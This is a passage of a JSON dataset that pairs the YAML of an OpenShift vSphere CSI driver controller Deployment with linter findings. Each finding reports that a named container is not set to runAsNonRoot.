    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: vmware-vsphere-csi-driver-controller\n  namespace: openshift-cluster-csi-drivers\n  annotations:\n    config.openshift.io/inject-proxy: csi-driver\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: vmware-vsphere-csi-driver-controller\n  template:\n    metadata:\n      labels:\n        app: vmware-vsphere-csi-driver-controller\n    spec:\n      serviceAccountName: vmware-vsphere-csi-driver-controller-sa\n      containers:\n      - name: csi-driver\n        image: ${DRIVER_IMAGE}\n        args:\n        - --fss-name=internal-feature-states.csi.vsphere.vmware.com\n        - --fss-namespace=$(CSI_NAMESPACE)\n        env:\n        - name: CSI_ENDPOINT\n          value: unix:///var/lib/csi/sockets/pluginproxy/csi.sock\n        - name: X_CSI_MODE\n          value: controller\n        - name: VSPHERE_CSI_CONFIG\n          value: /etc/kubernetes/vsphere-csi-config/cloud.conf\n        - name: LOGGER_LEVEL\n          value: PRODUCTION\n        - name: INCLUSTER_CLIENT_QPS\n          value: '100'\n        - name: INCLUSTER_CLIENT_BURST\n          value: '100'\n        - name: CSI_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        - name: X_CSI_SERIAL_VOL_ACCESS_TIMEOUT\n          value: 3m\n        - name: X_CSI_SPEC_DISABLE_LEN_CHECK\n          value: 'true'\n        ports:\n        - name: healthz\n          containerPort: 10301\n          protocol: TCP\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /var/lib/csi/sockets/pluginproxy/\n        - name: vsphere-csi-config-volume\n          mountPath: /etc/kubernetes/vsphere-csi-config/\n          readOnly: true\n        resources:\n          requests:\n            memory: 50Mi\n            cpu: 10m\n      - name: csi-provisioner\n        image: ${PROVISIONER_IMAGE}\n        args:\n        - --csi-address=$(ADDRESS)\n        - --default-fstype=ext4\n        - --v=${LOG_LEVEL}\n        - --leader-election\n        - --http-endpoint=localhost:8202\n        env:\n        - name: ADDRESS\n          value: /var/lib/csi/sockets/pluginproxy/csi.sock\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /var/lib/csi/sockets/pluginproxy/\n        resources:\n          requests:\n            memory: 50Mi\n            cpu: 10m\n      - name: provisioner-kube-rbac-proxy\n        args:\n        - --secure-listen-address=0.0.0.0:9202\n        - --upstream=http://127.0.0.1:8202/\n        - --tls-cert-file=/etc/tls/private/tls.crt\n        - --tls-private-key-file=/etc/tls/private/tls.key\n        - --logtostderr=true\n        image: ${KUBE_RBAC_PROXY_IMAGE}\n        imagePullPolicy: IfNotPresent\n        ports:\n        - containerPort: 9202\n          name: provisioner-m\n          protocol: TCP\n        resources:\n          requests:\n            memory: 20Mi\n            cpu: 10m\n        volumeMounts:\n        - mountPath: /etc/tls/private\n          name: metrics-serving-cert\n      - name: csi-attacher\n        image: ${ATTACHER_IMAGE}\n        args:\n        - --csi-address=$(ADDRESS)\n        - --http-endpoint=localhost:8203\n        - --v=${LOG_LEVEL}\n        env:\n        - name: ADDRESS\n          value: /var/lib/csi/sockets/pluginproxy/csi.sock\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /var/lib/csi/sockets/pluginproxy/\n        resources:\n          requests:\n            memory: 50Mi\n            cpu: 10m\n      - name: attacher-kube-rbac-proxy\n        args:\n        - --secure-listen-address=0.0.0.0:9203\n        - --upstream=http://127.0.0.1:8203/\n        - --tls-cert-file=/etc/tls/private/tls.crt\n        - --tls-private-key-file=/etc/tls/private/tls.key\n        - --logtostderr=true\n        image: ${KUBE_RBAC_PROXY_IMAGE}\n        imagePullPolicy: IfNotPresent\n        ports:\n        - containerPort: 9203\n          name: attacher-m\n          protocol: TCP\n        resources:\n          requests:\n            memory: 20Mi\n            cpu: 10m\n        volumeMounts:\n        - mountPath: /etc/tls/private\n          name: metrics-serving-cert\n      - name: csi-resizer\n        image: ${RESIZER_IMAGE}\n        args:\n        - --csi-address=$(ADDRESS)\n        - --http-endpoint=localhost:8204\n        - --v=${LOG_LEVEL}\n        env:\n        - name: ADDRESS\n          value: /var/lib/csi/sockets/pluginproxy/csi.sock\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /var/lib/csi/sockets/pluginproxy/\n        resources:\n          requests:\n            memory: 50Mi\n            cpu: 10m\n      - name: resizer-kube-rbac-proxy\n        args:\n        - --secure-listen-address=0.0.0.0:9204\n        - --upstream=http://127.0.0.1:8204/\n        - --tls-cert-file=/etc/tls/private/tls.crt\n        - --tls-private-key-file=/etc/tls/private/tls.key\n        - --logtostderr=true\n        image: ${KUBE_RBAC_PROXY_IMAGE}\n        imagePullPolicy: IfNotPresent\n        ports:\n        - containerPort: 9204\n          name: resizer-m\n          protocol: TCP\n        resources:\n          requests:\n            memory: 20Mi\n            cpu: 10m\n        volumeMounts:\n        - mountPath: /etc/tls/private\n          name: metrics-serving-cert\n      - name: csi-liveness-probe\n        image: ${LIVENESS_PROBE_IMAGE}\n        args:\n        - --csi-address=$(ADDRESS)\n        - --probe-timeout=3s\n        - --health-port=10301\n        env:\n        - name: ADDRESS\n          value: /var/lib/csi/sockets/pluginproxy/csi.sock\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /var/lib/csi/sockets/pluginproxy/\n        resources:\n          requests:\n            memory: 50Mi\n            cpu: 10m\n      - name: vsphere-syncer\n        image: ${VMWARE_VSPHERE_SYNCER_IMAGE}\n        args:\n        - --leader-election\n        - --fss-name=internal-feature-states.csi.vsphere.vmware.com\n        - --fss-namespace=$(CSI_NAMESPACE)\n        env:\n        - name: FULL_SYNC_INTERVAL_MINUTES\n          value: '30'\n        - name: VSPHERE_CSI_CONFIG\n          value: /etc/kubernetes/vsphere-csi-config/cloud.conf\n        - name: LOGGER_LEVEL\n          value: PRODUCTION\n        - name: INCLUSTER_CLIENT_QPS\n          value: '100'\n        - name: INCLUSTER_CLIENT_BURST\n          value: '100'\n        - name: CSI_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        volumeMounts:\n        - mountPath: /etc/kubernetes/vsphere-csi-config\n          name: vsphere-csi-config-volume\n          readOnly: true\n      volumes:\n      - name: socket-dir\n        emptyDir: {}\n      - name: vsphere-csi-config-volume\n        configMap:\n          name: vsphere-csi-config\n      - name: metrics-serving-cert\n        secret:\n          secretName: vmware-vsphere-csi-driver-controller-metrics-serving-cert\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"csi-liveness-probe\" is not set to runAsNonRoot"
  },
  {
    "id": "8987",
    "manifest_path": "data/manifests/the_stack_sample/sample_3389.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: vmware-vsphere-csi-driver-controller\n  namespace: openshift-cluster-csi-drivers\n  annotations:\n    config.openshift.io/inject-proxy: csi-driver\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: vmware-vsphere-csi-driver-controller\n  template:\n    metadata:\n      labels:\n        app: vmware-vsphere-csi-driver-controller\n    spec:\n      serviceAccountName: vmware-vsphere-csi-driver-controller-sa\n      containers:\n      - name: csi-driver\n        image: ${DRIVER_IMAGE}\n        args:\n        - --fss-name=internal-feature-states.csi.vsphere.vmware.com\n        - --fss-namespace=$(CSI_NAMESPACE)\n        env:\n        - name: CSI_ENDPOINT\n          value: unix:///var/lib/csi/sockets/pluginproxy/csi.sock\n        - name: X_CSI_MODE\n          value: controller\n        - name: VSPHERE_CSI_CONFIG\n          value: /etc/kubernetes/vsphere-csi-config/cloud.conf\n        - name: LOGGER_LEVEL\n          value: PRODUCTION\n        - name: INCLUSTER_CLIENT_QPS\n          value: '100'\n        - name: INCLUSTER_CLIENT_BURST\n          value: '100'\n        - name: CSI_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        - name: X_CSI_SERIAL_VOL_ACCESS_TIMEOUT\n          value: 3m\n        - name: X_CSI_SPEC_DISABLE_LEN_CHECK\n          value: 'true'\n        ports:\n        - name: healthz\n          containerPort: 10301\n          protocol: TCP\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /var/lib/csi/sockets/pluginproxy/\n        - name: vsphere-csi-config-volume\n          mountPath: /etc/kubernetes/vsphere-csi-config/\n          readOnly: true\n        resources:\n          requests:\n            memory: 50Mi\n            cpu: 10m\n      - name: csi-provisioner\n        image: ${PROVISIONER_IMAGE}\n        args:\n        - --csi-address=$(ADDRESS)\n        - --default-fstype=ext4\n        - --v=${LOG_LEVEL}\n        - --leader-election\n        - --http-endpoint=localhost:8202\n        env:\n        - name: ADDRESS\n          value: /var/lib/csi/sockets/pluginproxy/csi.sock\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /var/lib/csi/sockets/pluginproxy/\n        resources:\n          requests:\n            memory: 50Mi\n            cpu: 10m\n      - name: provisioner-kube-rbac-proxy\n        args:\n        - --secure-listen-address=0.0.0.0:9202\n        - --upstream=http://127.0.0.1:8202/\n        - --tls-cert-file=/etc/tls/private/tls.crt\n        - --tls-private-key-file=/etc/tls/private/tls.key\n        - --logtostderr=true\n        image: ${KUBE_RBAC_PROXY_IMAGE}\n        imagePullPolicy: IfNotPresent\n        ports:\n        - containerPort: 9202\n          name: provisioner-m\n          protocol: TCP\n        resources:\n          requests:\n            memory: 20Mi\n            cpu: 10m\n        volumeMounts:\n        - mountPath: /etc/tls/private\n          name: metrics-serving-cert\n      - name: csi-attacher\n        image: ${ATTACHER_IMAGE}\n        args:\n        - --csi-address=$(ADDRESS)\n        - --http-endpoint=localhost:8203\n        - --v=${LOG_LEVEL}\n        env:\n        - name: ADDRESS\n          value: /var/lib/csi/sockets/pluginproxy/csi.sock\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /var/lib/csi/sockets/pluginproxy/\n        resources:\n          requests:\n            memory: 50Mi\n            cpu: 10m\n      - name: attacher-kube-rbac-proxy\n        args:\n        - --secure-listen-address=0.0.0.0:9203\n        - --upstream=http://127.0.0.1:8203/\n        - --tls-cert-file=/etc/tls/private/tls.crt\n        - --tls-private-key-file=/etc/tls/private/tls.key\n        - --logtostderr=true\n        image: ${KUBE_RBAC_PROXY_IMAGE}\n        imagePullPolicy: IfNotPresent\n        ports:\n        - containerPort: 9203\n          name: attacher-m\n          protocol: TCP\n        resources:\n          requests:\n            memory: 20Mi\n            cpu: 10m\n        volumeMounts:\n        - mountPath: /etc/tls/private\n          name: metrics-serving-cert\n      - name: csi-resizer\n        image: ${RESIZER_IMAGE}\n        args:\n        - --csi-address=$(ADDRESS)\n        - --http-endpoint=localhost:8204\n        - --v=${LOG_LEVEL}\n        env:\n        - name: ADDRESS\n          value: /var/lib/csi/sockets/pluginproxy/csi.sock\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /var/lib/csi/sockets/pluginproxy/\n        resources:\n          requests:\n            memory: 50Mi\n            cpu: 10m\n      - name: resizer-kube-rbac-proxy\n        args:\n        - --secure-listen-address=0.0.0.0:9204\n        - --upstream=http://127.0.0.1:8204/\n        - --tls-cert-file=/etc/tls/private/tls.crt\n        - --tls-private-key-file=/etc/tls/private/tls.key\n        - --logtostderr=true\n        image: ${KUBE_RBAC_PROXY_IMAGE}\n        imagePullPolicy: IfNotPresent\n        ports:\n        - containerPort: 9204\n          name: resizer-m\n          protocol: TCP\n        resources:\n          requests:\n            memory: 20Mi\n            cpu: 10m\n        volumeMounts:\n        - mountPath: /etc/tls/private\n          name: metrics-serving-cert\n      - name: csi-liveness-probe\n        image: ${LIVENESS_PROBE_IMAGE}\n        args:\n        - --csi-address=$(ADDRESS)\n        - --probe-timeout=3s\n        - --health-port=10301\n        env:\n        - name: ADDRESS\n          value: /var/lib/csi/sockets/pluginproxy/csi.sock\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /var/lib/csi/sockets/pluginproxy/\n        resources:\n          requests:\n            memory: 50Mi\n            cpu: 10m\n      - name: vsphere-syncer\n        image: ${VMWARE_VSPHERE_SYNCER_IMAGE}\n        args:\n        - --leader-election\n        - --fss-name=internal-feature-states.csi.vsphere.vmware.com\n        - --fss-namespace=$(CSI_NAMESPACE)\n        env:\n        - name: FULL_SYNC_INTERVAL_MINUTES\n          value: '30'\n        - name: VSPHERE_CSI_CONFIG\n          value: /etc/kubernetes/vsphere-csi-config/cloud.conf\n        - name: LOGGER_LEVEL\n          value: PRODUCTION\n        - name: INCLUSTER_CLIENT_QPS\n          value: '100'\n        - name: INCLUSTER_CLIENT_BURST\n          value: '100'\n        - name: CSI_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        volumeMounts:\n        - mountPath: /etc/kubernetes/vsphere-csi-config\n          name: vsphere-csi-config-volume\n          readOnly: true\n      volumes:\n      - name: socket-dir\n        emptyDir: {}\n      - name: vsphere-csi-config-volume\n        configMap:\n          name: vsphere-csi-config\n      - name: metrics-serving-cert\n        secret:\n          secretName: vmware-vsphere-csi-driver-controller-metrics-serving-cert\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"csi-provisioner\" is not set to runAsNonRoot"
  },
  {
    "id": "8988",
    "manifest_path": "data/manifests/the_stack_sample/sample_3389.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: vmware-vsphere-csi-driver-controller\n  namespace: openshift-cluster-csi-drivers\n  annotations:\n    config.openshift.io/inject-proxy: csi-driver\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: vmware-vsphere-csi-driver-controller\n  template:\n    metadata:\n      labels:\n        app: vmware-vsphere-csi-driver-controller\n    spec:\n      serviceAccountName: vmware-vsphere-csi-driver-controller-sa\n      containers:\n      - name: csi-driver\n        image: ${DRIVER_IMAGE}\n        args:\n        - --fss-name=internal-feature-states.csi.vsphere.vmware.com\n        - --fss-namespace=$(CSI_NAMESPACE)\n        env:\n        - name: CSI_ENDPOINT\n          value: unix:///var/lib/csi/sockets/pluginproxy/csi.sock\n        - name: X_CSI_MODE\n          value: controller\n        - name: VSPHERE_CSI_CONFIG\n          value: /etc/kubernetes/vsphere-csi-config/cloud.conf\n        - name: LOGGER_LEVEL\n          value: PRODUCTION\n        - name: INCLUSTER_CLIENT_QPS\n          value: '100'\n        - name: INCLUSTER_CLIENT_BURST\n          value: '100'\n        - name: CSI_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        - name: X_CSI_SERIAL_VOL_ACCESS_TIMEOUT\n          value: 3m\n        - name: X_CSI_SPEC_DISABLE_LEN_CHECK\n          value: 'true'\n        ports:\n        - name: healthz\n          containerPort: 10301\n          protocol: TCP\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /var/lib/csi/sockets/pluginproxy/\n        - name: vsphere-csi-config-volume\n          mountPath: /etc/kubernetes/vsphere-csi-config/\n          readOnly: true\n        resources:\n          requests:\n            memory: 50Mi\n            cpu: 10m\n      - name: csi-provisioner\n        image: ${PROVISIONER_IMAGE}\n        args:\n        - --csi-address=$(ADDRESS)\n        - --default-fstype=ext4\n        - --v=${LOG_LEVEL}\n        - --leader-election\n        - --http-endpoint=localhost:8202\n        env:\n        - name: ADDRESS\n          value: /var/lib/csi/sockets/pluginproxy/csi.sock\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /var/lib/csi/sockets/pluginproxy/\n        resources:\n          requests:\n            memory: 50Mi\n            cpu: 10m\n      - name: provisioner-kube-rbac-proxy\n        args:\n        - --secure-listen-address=0.0.0.0:9202\n        - --upstream=http://127.0.0.1:8202/\n        - --tls-cert-file=/etc/tls/private/tls.crt\n        - --tls-private-key-file=/etc/tls/private/tls.key\n        - --logtostderr=true\n        image: ${KUBE_RBAC_PROXY_IMAGE}\n        imagePullPolicy: IfNotPresent\n        ports:\n        - containerPort: 9202\n          name: provisioner-m\n          protocol: TCP\n        resources:\n          requests:\n            memory: 20Mi\n            cpu: 10m\n        volumeMounts:\n        - mountPath: /etc/tls/private\n          name: metrics-serving-cert\n      - name: csi-attacher\n        image: ${ATTACHER_IMAGE}\n        args:\n        - --csi-address=$(ADDRESS)\n        - --http-endpoint=localhost:8203\n        - --v=${LOG_LEVEL}\n        env:\n        - name: ADDRESS\n          value: /var/lib/csi/sockets/pluginproxy/csi.sock\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /var/lib/csi/sockets/pluginproxy/\n        resources:\n          requests:\n            memory: 50Mi\n            cpu: 10m\n      - name: attacher-kube-rbac-proxy\n        args:\n        - --secure-listen-address=0.0.0.0:9203\n        - --upstream=http://127.0.0.1:8203/\n        - --tls-cert-file=/etc/tls/private/tls.crt\n        - --tls-private-key-file=/etc/tls/private/tls.key\n        - --logtostderr=true\n        image: ${KUBE_RBAC_PROXY_IMAGE}\n        imagePullPolicy: IfNotPresent\n        ports:\n        - containerPort: 9203\n          name: attacher-m\n          protocol: TCP\n        resources:\n          requests:\n            memory: 20Mi\n            cpu: 10m\n        volumeMounts:\n        - mountPath: /etc/tls/private\n          name: metrics-serving-cert\n      - name: csi-resizer\n        image: ${RESIZER_IMAGE}\n        args:\n        - --csi-address=$(ADDRESS)\n        - --http-endpoint=localhost:8204\n        - --v=${LOG_LEVEL}\n        env:\n        - name: ADDRESS\n          value: /var/lib/csi/sockets/pluginproxy/csi.sock\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /var/lib/csi/sockets/pluginproxy/\n        resources:\n          requests:\n            memory: 50Mi\n            cpu: 10m\n      - name: resizer-kube-rbac-proxy\n        args:\n        - --secure-listen-address=0.0.0.0:9204\n        - --upstream=http://127.0.0.1:8204/\n        - --tls-cert-file=/etc/tls/private/tls.crt\n        - --tls-private-key-file=/etc/tls/private/tls.key\n        - --logtostderr=true\n        image: ${KUBE_RBAC_PROXY_IMAGE}\n        imagePullPolicy: IfNotPresent\n        ports:\n        - containerPort: 9204\n          name: resizer-m\n          protocol: TCP\n        resources:\n          requests:\n            memory: 20Mi\n            cpu: 10m\n        volumeMounts:\n        - mountPath: /etc/tls/private\n          name: metrics-serving-cert\n      - name: csi-liveness-probe\n        image: ${LIVENESS_PROBE_IMAGE}\n        args:\n        - --csi-address=$(ADDRESS)\n        - --probe-timeout=3s\n        - --health-port=10301\n        env:\n        - name: ADDRESS\n          value: /var/lib/csi/sockets/pluginproxy/csi.sock\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /var/lib/csi/sockets/pluginproxy/\n        resources:\n          requests:\n            memory: 50Mi\n            cpu: 10m\n      - name: vsphere-syncer\n        image: ${VMWARE_VSPHERE_SYNCER_IMAGE}\n        args:\n        - --leader-election\n        - --fss-name=internal-feature-states.csi.vsphere.vmware.com\n        - --fss-namespace=$(CSI_NAMESPACE)\n        env:\n        - name: FULL_SYNC_INTERVAL_MINUTES\n          value: '30'\n        - name: VSPHERE_CSI_CONFIG\n          value: /etc/kubernetes/vsphere-csi-config/cloud.conf\n        - name: LOGGER_LEVEL\n          value: PRODUCTION\n        - name: INCLUSTER_CLIENT_QPS\n          value: '100'\n        - name: INCLUSTER_CLIENT_BURST\n          value: '100'\n        - name: CSI_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        volumeMounts:\n        - mountPath: /etc/kubernetes/vsphere-csi-config\n          name: vsphere-csi-config-volume\n          readOnly: true\n      volumes:\n      - name: socket-dir\n        emptyDir: {}\n      - name: vsphere-csi-config-volume\n        configMap:\n          name: vsphere-csi-config\n      - name: metrics-serving-cert\n        secret:\n          secretName: vmware-vsphere-csi-driver-controller-metrics-serving-cert\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"csi-resizer\" is not set to runAsNonRoot"
  },
  {
    "id": "8989",
    "manifest_path": "data/manifests/the_stack_sample/sample_3389.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: vmware-vsphere-csi-driver-controller\n  namespace: openshift-cluster-csi-drivers\n  annotations:\n    config.openshift.io/inject-proxy: csi-driver\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: vmware-vsphere-csi-driver-controller\n  template:\n    metadata:\n      labels:\n        app: vmware-vsphere-csi-driver-controller\n    spec:\n      serviceAccountName: vmware-vsphere-csi-driver-controller-sa\n      containers:\n      - name: csi-driver\n        image: ${DRIVER_IMAGE}\n        args:\n        - --fss-name=internal-feature-states.csi.vsphere.vmware.com\n        - --fss-namespace=$(CSI_NAMESPACE)\n        env:\n        - name: CSI_ENDPOINT\n          value: unix:///var/lib/csi/sockets/pluginproxy/csi.sock\n        - name: X_CSI_MODE\n          value: controller\n        - name: VSPHERE_CSI_CONFIG\n          value: /etc/kubernetes/vsphere-csi-config/cloud.conf\n        - name: LOGGER_LEVEL\n          value: PRODUCTION\n        - name: INCLUSTER_CLIENT_QPS\n          value: '100'\n        - name: INCLUSTER_CLIENT_BURST\n          value: '100'\n        - name: CSI_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        - name: X_CSI_SERIAL_VOL_ACCESS_TIMEOUT\n          value: 3m\n        - name: X_CSI_SPEC_DISABLE_LEN_CHECK\n          value: 'true'\n        ports:\n        - name: healthz\n          containerPort: 10301\n          protocol: TCP\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /var/lib/csi/sockets/pluginproxy/\n        - name: vsphere-csi-config-volume\n          mountPath: /etc/kubernetes/vsphere-csi-config/\n          readOnly: true\n        resources:\n          requests:\n            memory: 50Mi\n            cpu: 10m\n      - name: csi-provisioner\n        image: ${PROVISIONER_IMAGE}\n        args:\n        - --csi-address=$(ADDRESS)\n        - --default-fstype=ext4\n        - --v=${LOG_LEVEL}\n        - --leader-election\n        - --http-endpoint=localhost:8202\n        env:\n        - name: ADDRESS\n          value: /var/lib/csi/sockets/pluginproxy/csi.sock\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /var/lib/csi/sockets/pluginproxy/\n        resources:\n          requests:\n            memory: 50Mi\n            cpu: 10m\n      - name: provisioner-kube-rbac-proxy\n        args:\n        - --secure-listen-address=0.0.0.0:9202\n        - --upstream=http://127.0.0.1:8202/\n        - --tls-cert-file=/etc/tls/private/tls.crt\n        - --tls-private-key-file=/etc/tls/private/tls.key\n        - --logtostderr=true\n        image: ${KUBE_RBAC_PROXY_IMAGE}\n        imagePullPolicy: IfNotPresent\n        ports:\n        - containerPort: 9202\n          name: provisioner-m\n          protocol: TCP\n        resources:\n          requests:\n            memory: 20Mi\n            cpu: 10m\n        volumeMounts:\n        - mountPath: /etc/tls/private\n          name: metrics-serving-cert\n      - name: csi-attacher\n        image: ${ATTACHER_IMAGE}\n        args:\n        - --csi-address=$(ADDRESS)\n        - --http-endpoint=localhost:8203\n        - --v=${LOG_LEVEL}\n        env:\n        - name: ADDRESS\n          value: /var/lib/csi/sockets/pluginproxy/csi.sock\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /var/lib/csi/sockets/pluginproxy/\n        resources:\n          requests:\n            memory: 50Mi\n            cpu: 10m\n      - name: attacher-kube-rbac-proxy\n        args:\n        - --secure-listen-address=0.0.0.0:9203\n        - --upstream=http://127.0.0.1:8203/\n        - --tls-cert-file=/etc/tls/private/tls.crt\n        - --tls-private-key-file=/etc/tls/private/tls.key\n        - --logtostderr=true\n        image: ${KUBE_RBAC_PROXY_IMAGE}\n        imagePullPolicy: IfNotPresent\n        ports:\n        - containerPort: 9203\n          name: attacher-m\n          protocol: TCP\n        resources:\n          requests:\n            memory: 20Mi\n            cpu: 10m\n        volumeMounts:\n        - mountPath: /etc/tls/private\n          name: metrics-serving-cert\n      - name: csi-resizer\n        image: ${RESIZER_IMAGE}\n        args:\n        - --csi-address=$(ADDRESS)\n        - --http-endpoint=localhost:8204\n        - --v=${LOG_LEVEL}\n        env:\n        - name: ADDRESS\n          value: /var/lib/csi/sockets/pluginproxy/csi.sock\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /var/lib/csi/sockets/pluginproxy/\n        resources:\n          requests:\n            memory: 50Mi\n            cpu: 10m\n      - name: resizer-kube-rbac-proxy\n        args:\n        - --secure-listen-address=0.0.0.0:9204\n        - --upstream=http://127.0.0.1:8204/\n        - --tls-cert-file=/etc/tls/private/tls.crt\n        - --tls-private-key-file=/etc/tls/private/tls.key\n        - --logtostderr=true\n        image: ${KUBE_RBAC_PROXY_IMAGE}\n        imagePullPolicy: IfNotPresent\n        ports:\n        - containerPort: 9204\n          name: resizer-m\n          protocol: TCP\n        resources:\n          requests:\n            memory: 20Mi\n            cpu: 10m\n        volumeMounts:\n        - mountPath: /etc/tls/private\n          name: metrics-serving-cert\n      - name: csi-liveness-probe\n        image: ${LIVENESS_PROBE_IMAGE}\n        args:\n        - --csi-address=$(ADDRESS)\n        - --probe-timeout=3s\n        - --health-port=10301\n        env:\n        - name: ADDRESS\n          value: /var/lib/csi/sockets/pluginproxy/csi.sock\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /var/lib/csi/sockets/pluginproxy/\n        resources:\n          requests:\n            memory: 50Mi\n            cpu: 10m\n      - name: vsphere-syncer\n        image: ${VMWARE_VSPHERE_SYNCER_IMAGE}\n        args:\n        - --leader-election\n        - --fss-name=internal-feature-states.csi.vsphere.vmware.com\n        - --fss-namespace=$(CSI_NAMESPACE)\n        env:\n        - name: FULL_SYNC_INTERVAL_MINUTES\n          value: '30'\n        - name: VSPHERE_CSI_CONFIG\n          value: /etc/kubernetes/vsphere-csi-config/cloud.conf\n        - name: LOGGER_LEVEL\n          value: PRODUCTION\n        - name: INCLUSTER_CLIENT_QPS\n          value: '100'\n        - name: INCLUSTER_CLIENT_BURST\n          value: '100'\n        - name: CSI_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        volumeMounts:\n        - mountPath: /etc/kubernetes/vsphere-csi-config\n          name: vsphere-csi-config-volume\n          readOnly: true\n      volumes:\n      - name: socket-dir\n        emptyDir: {}\n      - name: vsphere-csi-config-volume\n        configMap:\n          name: vsphere-csi-config\n      - name: metrics-serving-cert\n        secret:\n          secretName: vmware-vsphere-csi-driver-controller-metrics-serving-cert\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"provisioner-kube-rbac-proxy\" is not set to runAsNonRoot"
  },
  {
    "id": "8990",
    "manifest_path": "data/manifests/the_stack_sample/sample_3389.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: vmware-vsphere-csi-driver-controller\n  namespace: openshift-cluster-csi-drivers\n  annotations:\n    config.openshift.io/inject-proxy: csi-driver\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: vmware-vsphere-csi-driver-controller\n  template:\n    metadata:\n      labels:\n        app: vmware-vsphere-csi-driver-controller\n    spec:\n      serviceAccountName: vmware-vsphere-csi-driver-controller-sa\n      containers:\n      - name: csi-driver\n        image: ${DRIVER_IMAGE}\n        args:\n        - --fss-name=internal-feature-states.csi.vsphere.vmware.com\n        - --fss-namespace=$(CSI_NAMESPACE)\n        env:\n        - name: CSI_ENDPOINT\n          value: unix:///var/lib/csi/sockets/pluginproxy/csi.sock\n        - name: X_CSI_MODE\n          value: controller\n        - name: VSPHERE_CSI_CONFIG\n          value: /etc/kubernetes/vsphere-csi-config/cloud.conf\n        - name: LOGGER_LEVEL\n          value: PRODUCTION\n        - name: INCLUSTER_CLIENT_QPS\n          value: '100'\n        - name: INCLUSTER_CLIENT_BURST\n          value: '100'\n        - name: CSI_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        - name: X_CSI_SERIAL_VOL_ACCESS_TIMEOUT\n          value: 3m\n        - name: X_CSI_SPEC_DISABLE_LEN_CHECK\n          value: 'true'\n        ports:\n        - name: healthz\n          containerPort: 10301\n          protocol: TCP\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /var/lib/csi/sockets/pluginproxy/\n        - name: vsphere-csi-config-volume\n          mountPath: /etc/kubernetes/vsphere-csi-config/\n          readOnly: true\n        resources:\n          requests:\n            memory: 50Mi\n            cpu: 10m\n      - name: csi-provisioner\n        image: ${PROVISIONER_IMAGE}\n        args:\n        - --csi-address=$(ADDRESS)\n        - --default-fstype=ext4\n        - --v=${LOG_LEVEL}\n        - --leader-election\n        - --http-endpoint=localhost:8202\n        env:\n        - name: ADDRESS\n          value: /var/lib/csi/sockets/pluginproxy/csi.sock\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /var/lib/csi/sockets/pluginproxy/\n        resources:\n          requests:\n            memory: 50Mi\n            cpu: 10m\n      - name: provisioner-kube-rbac-proxy\n        args:\n        - --secure-listen-address=0.0.0.0:9202\n        - --upstream=http://127.0.0.1:8202/\n        - --tls-cert-file=/etc/tls/private/tls.crt\n        - --tls-private-key-file=/etc/tls/private/tls.key\n        - --logtostderr=true\n        image: ${KUBE_RBAC_PROXY_IMAGE}\n        imagePullPolicy: IfNotPresent\n        ports:\n        - containerPort: 9202\n          name: provisioner-m\n          protocol: TCP\n        resources:\n          requests:\n            memory: 20Mi\n            cpu: 10m\n        volumeMounts:\n        - mountPath: /etc/tls/private\n          name: metrics-serving-cert\n      - name: csi-attacher\n        image: ${ATTACHER_IMAGE}\n        args:\n        - --csi-address=$(ADDRESS)\n        - --http-endpoint=localhost:8203\n        - --v=${LOG_LEVEL}\n        env:\n        - name: ADDRESS\n          value: /var/lib/csi/sockets/pluginproxy/csi.sock\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /var/lib/csi/sockets/pluginproxy/\n        resources:\n          requests:\n            memory: 50Mi\n            cpu: 10m\n      - name: attacher-kube-rbac-proxy\n        args:\n        - --secure-listen-address=0.0.0.0:9203\n        - --upstream=http://127.0.0.1:8203/\n        - --tls-cert-file=/etc/tls/private/tls.crt\n        - --tls-private-key-file=/etc/tls/private/tls.key\n        - --logtostderr=true\n        image: 